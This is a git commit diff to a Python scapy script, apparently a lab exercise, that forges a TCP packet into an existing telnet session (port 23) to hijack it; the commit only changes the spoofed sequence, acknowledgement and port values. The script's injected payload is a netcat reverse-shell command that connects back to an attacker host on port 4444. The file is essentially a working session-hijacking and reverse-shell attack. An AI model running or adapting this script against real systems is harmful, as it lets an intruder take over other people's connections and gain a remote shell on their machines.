7916ff33a05d0b99cb052a29c3ce391addba3de7
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-29 23:07:28 +0800

    Update Q4_reverse.py

--- Code Files/Q4_reverse.py
+++ Code Files/Q4_reverse.py
@@ -3,7 +3,7 @@ import sys
 from scapy.all import *
 
 IPLayer = IP (src="10.10.10.188", dst = "10.10.10.195")
-TCPLayer = TCP (sport=58470, dport=23, flags="A", seq=428434951, ack=2941347577)
+TCPLayer = TCP (sport=60840, dport=23, flags="A", seq=219454568, ack=157833944)
 
 data = "\n nc -e /bin/sh 10.10.10.186 4444 \n"
 
